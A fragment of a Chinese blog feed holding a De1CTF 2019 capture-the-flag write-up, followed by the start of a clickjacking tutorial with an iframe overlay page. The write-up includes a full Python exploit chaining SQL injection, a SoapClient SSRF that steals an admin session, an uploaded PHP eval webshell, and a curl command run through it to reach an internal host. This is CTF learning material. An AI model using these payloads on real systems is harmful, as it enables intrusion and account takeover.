以写的形式打开result.txt文件</span></span><br><span class="line">                resp = scan(self.param) <span class="comment"># 进行某些操作 会根据param生成一个特殊的链接</span></span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>) <span class="comment"># 以读的形式打开result.txt文件</span></span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign): <span class="comment">#验证签名 </span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>因为题目提示flag在./flag.txt中，所以我们需要构造param为flag.txt，我们先用<code>geneSign()</code>生成action=scan,param=flag.txt 的签名</p><p><img src="/2019/09/12/De1CTF-wp/2019-08-05_100539.bmp" alt="2019-08-05_100539"></p><p>然后使用工具<strong>HashPump</strong>生成action包含read的签名</p><p><img src="/2019/09/12/De1CTF-wp/1564970682579.png" alt="1564970682579"></p><p>带着准备好的参数去访问<code>/De1ta</code>，得到flag</p><p><img src="/2019/09/12/De1CTF-wp/2019-08-05_100042.bmp" alt="2019-08-05_100042"></p><h3 id="shellshellshell"><a href="#shellshellshell" class="headerlink" title="shellshellshell"></a>shellshellshell</h3><blockquote><p>这道题是参考大佬们的wp，然后在<a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">这个平台</a>上面再打了一遍</p></blockquote><ol><li><p>首先打开靶机，是一个登陆页面，用目录扫描工具扫一下（我用的是<a href="https://github.com/WangYihang/SourceLeakHacker" target="_blank" rel="noopener">SourceLeakHacker</a>），发现有两个路径能访问</p><p><img src="/2019/09/12/De1CTF-wp/2019-08-16_170137.bmp" alt="2019-08-16_170137"></p><p>访问<code>http://web69.node1.buuoj.cn/views/</code>发现是模板文件</p><p><img src="/2019/09/12/De1CTF-wp/2019-08-16_170104.bmp" alt="2019-08-16_170104"></p><p>通过大佬们的wp发现还有备份文件泄露（user.php<del>,config.php</del>和index.php~），访问将文件下载到本地进行审计（我太菜了o(╥﹏╥)o ，得多练练），发现config.php中的insert函数存在sql注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($columns,$table,$values)</span></span>&#123;</span><br><span class="line">    $column = <span class="keyword">$this</span>-&gt;get_column($columns);</span><br><span class="line">    $value = <span class="string">'('</span>.preg_replace(<span class="string">'/`([^`,]+)`/'</span>,<span class="string">'\'$&#123;1&#125;\''</span>,<span class="keyword">$this</span>-&gt;get_column($values)).<span class="string">')'</span>;</span><br><span class="line">    $nid =</span><br><span class="line">    $sql = <span class="string">'insert into '</span>.$table.<span class="string">'('</span>.$column.<span class="string">') values '</span>.$value; </span><br><span class="line">    <span class="comment">//$value = ('username','userid','$_post','mod')</span></span><br><span class="line">    <span class="comment">//post提交 aaa`, `0`)#</span></span><br><span class="line">    <span class="comment">//$value = ('username','userid',' aaa`, `0`)# ','mod')</span></span><br><span class="line">    <span class="comment">//`也可以闭合单引号</span></span><br><span class="line">    $result = <span class="keyword">$this</span>-&gt;conn-&gt;query($sql);</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在user.php中的publish调用了insert函数，所以我们可以通过访问<code>http://web69.node1.buuoj.cn/index.php?action=publish</code>，编写脚本，通过对它进行sql注入，获取管理员密码为<code>jaivypassword</code>（脚本见后面）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">publish</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">//首先判断是否登录 </span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;check_login()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;is_admin == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'signature'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'mood'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">                $mood = addslashes(serialize(<span class="keyword">new</span> Mood((int)$_POST[<span class="string">'mood'</span>],get_ip())));</span><br><span class="line">                $db = <span class="keyword">new</span> Db();</span><br><span class="line">                @$ret = $db-&gt;insert(<span class="keyword">array</span>(<span class="string">'userid'</span>,<span class="string">'username'</span>,<span class="string">'signature'</span>,<span class="string">'mood'</span>),<span class="string">'ctf_user_signature'</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;userid,<span class="keyword">$this</span>-&gt;username,$_POST[<span class="string">'signature'</span>],$mood));</span><br><span class="line">                <span class="keyword">if</span>($ret)</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'pic'</span>])) </span><br><span class="line">                &#123;</span><br><span class="line">                    $dir=<span class="string">'/app/upload/'</span>;</span><br><span class="line">                    move_uploaded_file($_FILES[<span class="string">'pic'</span>][<span class="string">'tmp_name'</span>],$dir.$_FILES[<span class="string">'pic'</span>][<span class="string">'name'</span>]);</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('"</span>.$_FILES[<span class="string">'pic'</span>][<span class="string">'name'</span>].<span class="string">"upload success');&lt;/script&gt;"</span>;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>拿到管理员账号密码后，登录进去，来到<code>publish</code>可以看到提示并有一个文件上传的按钮</p></li></ol><p>​    <img src="/2019/09/12/De1CTF-wp/2019-08-13_102242.bmp" alt="2019-08-13_102242"></p><p>​        我们上传一个一句话木马来getshell,然后连上蚁剑</p><p>未完待续··· ···</p><hr><p>（图先存着，之后有时间再详细说下 (#^.^#) )</p><p>（脚本先放出来啦，如需使用可以自己试着慢慢调试）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-   </span></span><br><span class="line"><span class="keyword">import</span> hashlib,requests,re,os,string,random</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">codes</span><span class="params">(cipher)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        plain = os.urandom(<span class="number">16</span>).hex()</span><br><span class="line">        <span class="keyword">if</span> hashlib.md5(plain.encode(<span class="string">"utf-8"</span>)).hexdigest()[:<span class="number">5</span>] == cipher:</span><br><span class="line">            <span class="keyword">return</span> plain</span><br><span class="line">            exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破code</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code</span><span class="params">(html)</span>:</span></span><br><span class="line">    re_res = re.findall(<span class="string">'Code\(substr\(md5\(\?\), 0, 5\) === ([\w]+)\)'</span>,html)[<span class="number">0</span>]</span><br><span class="line">    print(<span class="string">"[md5]: "</span>+re_res)</span><br><span class="line">    p = multiprocessing.Pool(<span class="number">15</span>)</span><br><span class="line">    code = <span class="string">''</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res = p.apply_async(codes,(re_res,))</span><br><span class="line">        <span class="keyword">if</span> res.get() != <span class="literal">None</span>:</span><br><span class="line">            code = res.get()</span><br><span class="line">            print(<span class="string">"[code]: &#123;&#125;"</span>.format(code))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注册</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(username,password)</span>:</span></span><br><span class="line">    url = target + <span class="string">"register"</span></span><br><span class="line">    get_res = sess.get(url)<span class="comment">#,cookies=cookies)</span></span><br><span class="line">    usersess = re.findall(<span class="string">'PHPSESSID=(\w+);'</span>,get_res.headers[<span class="string">'Set-Cookie'</span>])[<span class="number">0</span>] <span class="comment">#获取用户sessid</span></span><br><span class="line">    code = get_code(get_res.text)</span><br><span class="line">    post_res = sess.post(url,data=&#123;<span class="string">'username'</span>:username, <span class="string">'password'</span>:password, <span class="string">'code'</span>:code&#125;)<span class="comment">#,cookies=cookies)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'index.php?action=login'</span> <span class="keyword">in</span> post_res.text:</span><br><span class="line">        print(<span class="string">'[User Session]: &#123;&#125;'</span>.format(usersess))</span><br><span class="line">        print(<span class="string">"[Register]: Register Success!\n"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(post_res.text)</span><br><span class="line">        exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username,password)</span>:</span></span><br><span class="line">    url = target + <span class="string">"login"</span></span><br><span class="line">    get_res = sess.get(url)<span class="comment">#,cookies=cookies)</span></span><br><span class="line">    code = get_code(get_res.text)</span><br><span class="line">    post_res = sess.post(url,data=&#123;<span class="string">'username'</span>:username, <span class="string">'password'</span>:password, <span class="string">'code'</span>:code&#125;)<span class="comment">#,cookies=cookies)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'index.php?action=profile'</span> <span class="keyword">in</span> post_res.text:</span><br><span class="line">        print(<span class="string">"[Login]: &#123;&#125; !! Login Success! \n"</span>.format(username))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(post_res.text)</span><br><span class="line">        exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取payload</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mood</span><span class="params">()</span>:</span></span><br><span class="line">    admin_sessionid,code = get_admin_session()</span><br><span class="line">    data = <span class="string">'username=admin&amp;password=jaivypassword&amp;code='</span> + code</span><br><span class="line">    ssrf = <span class="string">"yue\r\nContent-Type: application/x-www-form-urlencoded\r\nX-Forwarded-For: 127.0.0.1\r\nCookie: PHPSESSID=&#123;phpsessid&#125;\r\nContent-Length: &#123;length&#125;\r\n\r\n&#123;data&#125;"</span>.format(phpsessid=admin_sessionid,length=len(data),data=data)</span><br><span class="line">    mood = <span class="string">'O:10:"SoapClient":4:&#123;&#123;s:3:"uri";s:4:"aaab";s:8:"location";s:39:"http://127.0.0.1/index.php?action=login";s:11:"_user_agent";s:&#123;ssrf_len&#125;:"&#123;_ssrf&#125;";s:13:"_soap_version";i:1;&#125;&#125;'</span>.format(ssrf_len=len(ssrf),_ssrf=ssrf)</span><br><span class="line">    mood = mood.encode(encoding=<span class="string">'utf-8'</span>).hex()</span><br><span class="line">    <span class="keyword">return</span> mood,admin_sessionid</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用该链接存在的sql注入打入ssrf 获取admin的sessionid</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">publish</span><span class="params">()</span>:</span></span><br><span class="line">    url = target + <span class="string">'publish'</span></span><br><span class="line">    mood,admin_sessionid = get_mood()</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'signature'</span>:<span class="string">'aaa`,0x&#123;&#125;)-- -'</span>.format(mood),</span><br><span class="line">        <span class="string">'mood'</span>:<span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = sess.post(url,data=data)<span class="comment">#,cookies=cookies)</span></span><br><span class="line">    print(<span class="string">'[admin sessid]: '</span> + admin_sessionid + <span class="string">'\n'</span>)</span><br><span class="line">    sess.get(target+<span class="string">'index'</span>) <span class="comment">#执行漏洞 获取admin</span></span><br><span class="line">    <span class="keyword">return</span> admin_sessionid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    res = sess.get(target + <span class="string">'logout'</span>)<span class="comment">#,cookies=cookies)</span></span><br><span class="line">    print(res.request.headers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成一个sesionid作为admin session ,返回phpsessid,code</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_admin_session</span><span class="params">()</span>:</span></span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    res = sess.get(target + <span class="string">'login'</span>)</span><br><span class="line">    phpsessid = re.findall(<span class="string">'PHPSESSID=(\w+);'</span>,res.headers[<span class="string">'Set-Cookie'</span>])[<span class="number">0</span>]</span><br><span class="line">    code = get_code(res.text)</span><br><span class="line">    <span class="keyword">return</span> phpsessid,code</span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机生成usename和password</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_name_and_pwd</span><span class="params">()</span>:</span></span><br><span class="line">    username = <span class="string">''</span>.join(random.sample(string.ascii_lowercase,<span class="number">8</span>))</span><br><span class="line">    password = username</span><br><span class="line">    print(<span class="string">"[username,password]: &#123;&#125;,&#123;&#125; \n"</span>.format(username,password))</span><br><span class="line">    <span class="keyword">return</span> username,password</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传shell1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">(admin_sessionid)</span>:</span></span><br><span class="line">    files = &#123;<span class="string">'pic'</span>:(<span class="string">'a2.php'</span>,<span class="string">'&lt;?php @eval($_POST["yue"]);?&gt;'</span>,<span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">    res = requests.post(target + <span class="string">'publish'</span>,files=files,cookies=&#123;<span class="string">'PHPSESSID'</span>:admin_sessionid&#125;)</span><br><span class="line">    shell_url = _action+<span class="string">'upload/a2.php'</span></span><br><span class="line">    <span class="comment"># print(res.text)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'success'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(<span class="string">'[upload]: success!'</span>)</span><br><span class="line">        print(<span class="string">'[shell]: &#123;&#125;'</span>.format(shell_url))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'[upload]: failed! Please check your admin sessionid!'</span>)</span><br><span class="line">        exit(<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> shell_url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    _action = <span class="string">'http://web69.node1.buuoj.cn/'</span></span><br><span class="line">    target = _action + <span class="string">'index.php?action='</span></span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    print(<span class="string">'*'</span> * <span class="number">30</span> + <span class="string">" Username Password "</span> + <span class="string">'*'</span> * <span class="number">30</span>)</span><br><span class="line">    username,password = get_name_and_pwd() <span class="comment">#username=admin&amp;password=jaivypassword</span></span><br><span class="line">    print(<span class="string">'*'</span> * <span class="number">30</span> + <span class="string">" Register "</span> + <span class="string">'*'</span> * <span class="number">30</span>)</span><br><span class="line">    register(username,password)</span><br><span class="line">    print(<span class="string">'*'</span> * <span class="number">30</span> + <span class="string">" Login "</span> + <span class="string">'*'</span> * <span class="number">30</span>)</span><br><span class="line">    login(username,password)</span><br><span class="line">    print(<span class="string">'*'</span> * <span class="number">30</span> + <span class="string">" Publish "</span> + <span class="string">'*'</span> * <span class="number">30</span>)</span><br><span class="line">    admin_sessionid = publish()</span><br><span class="line">    print(<span class="string">'*'</span> * <span class="number">30</span> + <span class="string">" Admin Upload "</span> + <span class="string">'*'</span> * <span class="number">30</span>)</span><br><span class="line">    shell_url = upload(admin_sessionid)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#上传shell2 </span></span><br><span class="line">    <span class="comment"># payload = '''@&lt;?php system("ls /etc") ?&gt;''' //先用这个payload找到flag文件，再用下面的payload读取flag</span></span><br><span class="line">    payload = <span class="string">'''@&lt;?php system("cat /etc/flag_is_He4e_89587236.txt") ?&gt;'''</span></span><br><span class="line">    res_upload = requests.post(target + <span class="string">'publish'</span>,files=&#123;<span class="string">'pic'</span>:(<span class="string">'000.php'</span>,payload,<span class="string">'image/jpeg'</span>)&#125;,cookies=&#123;<span class="string">'PHPSESSID'</span>:admin_sessionid&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 利用shell1在我们能访问的内网上（127.0.0.1）向目标内网传送文件getshell2</span></span><br><span class="line">    <span class="comment">#先传file[1],再传file[0]是为了绕过end(),"file[0]=/../000.php"是为了绕过unlink</span></span><br><span class="line">    curl = <span class="string">'''curl http://172.16.54.2 -F "file=@/var/www/html/upload/000.php" -F "file[1]=111" -F "file[0]=/../000.php" -F "hello=000.php" '''</span></span><br><span class="line">    res = sess.post(shell_url,data=&#123;<span class="string">'yue'</span>:<span class="string">'system("&#123;&#125;");'</span>.format(curl)&#125;)</span><br><span class="line"></span><br><span class="line">    print(res.text)</span><br></pre></td></tr></table></figure><p><img src="/2019/09/12/De1CTF-wp/2019-08-13_161420.bmp" alt="2019-08-13_161420"></p><p><img src="/2019/09/12/De1CTF-wp/2019-08-16_151855.bmp" alt="2019-08-16_151855"></p><p><img src="/2019/09/12/De1CTF-wp/2019-08-16_152246.bmp" alt="2019-08-16_152246"></p><p><img src="/2019/09/12/De1CTF-wp/2019-08-16_153621.bmp" alt="2019-08-16_153621"></p><p><img src="/2019/09/12/De1CTF-wp/2019-08-16_153706.bmp" alt="2019-08-16_153706"></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Mine-Sweeping"><a href="#Mine-Sweeping" class="headerlink" title="Mine Sweeping"></a>Mine Sweeping</h3><p>附件一个压缩包，下载，是一个扫雷游戏；玩了一下，发现雷的位置是不变的</p><p>然后。。。。。然后。。我就建了一个Excel表，把雷的位置都记了下来。。发现是个二维码。。简直心累。。</p><p>当然还有更好的解决办法（我还是太菜了o(╥﹏╥)o），以后有时间再去研究吧</p><p><img src="/2019/09/12/De1CTF-wp/2019-08-05_101938.bmp" alt="2019-08-05_101938"></p><p>用QR Research扫一下</p><p><img src="/2019/09/12/De1CTF-wp/2019-08-05_102146.bmp" alt="2019-08-05_102146"></p><p>得到一个链接，点进去就是falg。。</p><p><img src="/2019/09/12/De1CTF-wp/2019-08-05_102600.bmp" alt="2019-08-05_102600"></p><p>参考链接：<a href="https://www.zhaoj.in/read-6170.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6170.html</a> （大佬的很详细哦~，而且web挺全的）</p><p>推荐一个靶场：<a href="https://buuoj.cn/login?next=%2Fchallenges%3F" target="_blank" rel="noopener">https://buuoj.cn/login?next=%2Fchallenges%3F</a> （上面那位大佬维护的，很多题目都有在里面复现，web方向可能会全一点（大佬专web），可以在里面好好玩(๑′ᴗ‵๑) ）</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;这是之前比赛后不久就写的wp，一直没有放出来，清理东西的时候看到了就想着先放出来吧（虽然我还没写完o(╯□╰)o，有时间在补吧。嘻嘻(#^.^#)）&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://leonardo-o1.github.io/categories/ctf/"/>
    
    
    <category term="wp" scheme="https://leonardo-o1.github.io/tags/wp/"/>
    
    <category term="ctf" scheme="https://leonardo-o1.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>点击劫持</title>
    <link href="https://leonardo-o1.github.io/2019/09/10/%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/"/>
    <id>https://leonardo-o1.github.io/2019/09/10/%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/</id>
    <published>2019-09-10T15:22:18.000Z</published>
    <updated>2019-09-10T16:02:09.769Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>百度解释：点击劫持，clickJacking，也被称为UI-覆盖攻击，它是通过覆盖不可见的框架误导受害者点击。</p><p>虽然受害者点击的是他所看到的的网页，但其实他所点击的是被黑客精心构建的另一个置于原网页上面的透明页面。</p><p>这种攻击利用了HTML中<code>&lt;iframe&gt;</code>标签的透明属性</p></blockquote><p>最近在复核漏洞的时候碰到了<strong>点击劫持</strong>，由于以前没有看到过，所以简单记录一下(#^.^#)。</p><a id="more"></a><p>我觉得下面这张图很形象，我们打开网页看到的是<strong>页面B</strong>，而实际操作的<strong>页面A</strong>。由于利用HTML的<code>&lt;iframe&gt;</code>标签的透明属性，攻击者可以利用该标签内嵌任意一个网站，将其设置为透明；攻击者通过调整<strong>页面B</strong>，从而实现用户对<strong>页面A</strong>的操作，而用户是不知情的。下面演示一个简单的例子：</p><p><img src="/2019/09/10/点击劫持/timg.jpg" alt="timg"></p><h3 id="简单演示"><a href="#简单演示" class="headerlink" title="简单演示"></a>简单演示</h3><ol><li>准备页面B，使用<code>&lt;iframe&gt;</code>标签内嵌一个贴吧链接</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE HTML&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>点击劫持<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">     html,body,iframe&#123;</span><br><span class="line">         display: block;</span><br><span class="line">          height: 100%;</span><br><span class="line">          width: 100%;</span><br><span class="line">          margin: 0;</span><br><span class="line">          padding: 0;</span><br><span class="line"><span class="css">          <span class="selector-tag">border</span><span class="selector-pseudo">:none</span>;</span></span><br><span class="line">     &#125;</span><br><span class="line">     iframe&#123;</span><br><span class="line"><span class="css">          <span class="comment">/*opacity:0;*/</span></span></span><br><span class="line"><span class="css">          <span class="selector-tag">opacity</span><span class="selector-pseudo">:0.1</span>;</span></span><br><span class="line">          filter:alpha(opacity=0);</span><br><span class="line"><span class="css">          <span class="selector-tag">position</span><span class="selector-pseudo">:absolute</span>;</span></span><br><span class="line"><span class="css">          <span class="selector-tag">z-index</span><span class="selector-pseudo">:2</span>;</span></span><br><span class="line">     &#125;</span><br><span class="line">     button&#123;</span><br><span class="line"><span class="css">          <span class="selector-tag">position</span><span class="selector-pseudo">:absolute</span>;</span></span><br><span class="line">          top: 355px;</span><br><span class="line">          left: 620px;</span><br><span class="line">          z-index: 1;</span><br><span class="line">          width: 80px;</span><br><span class="line">          height: 26px;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span 